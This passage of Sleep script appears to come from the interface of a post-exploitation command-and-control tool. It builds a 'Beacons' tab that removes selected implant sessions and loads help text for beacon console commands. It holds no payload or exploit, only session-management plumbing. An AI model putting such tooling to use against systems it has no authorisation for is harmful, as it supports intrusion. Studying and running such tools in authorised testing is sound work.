		@names = [$model getSelectedValues: $table];
		foreach $name (@names) {
			call_async($mclient, "beacon.remove", $name);
			call_async($mclient, "beacon.remove2", $name);
		}
	}, \$table, \$model)];

	[$dialog add: center($interact, $delete, $help), [BorderLayout SOUTH]];
	[$frame addTab: "Beacons", $dialog, lambda({
		# signal to our timer that we're done...
		writeb($timer, 1);
	}, \$timer)];
}

sub processBeaconHelp {
	this('$help');
	if ($help is $null) {
		$help = %();

		local('$handle $text $command');
		$handle = [SleepUtils getIOHandle: resource("resources/beacon.txt"), $null];
		while $text (readln($handle)) {
			if ($text ismatch 'beacon> (.*)') {
				$command = matched()[0];
			}
			else {
				$help[$command] .= "$text $+ \n";
			}
		}
	}
	return $help;
}
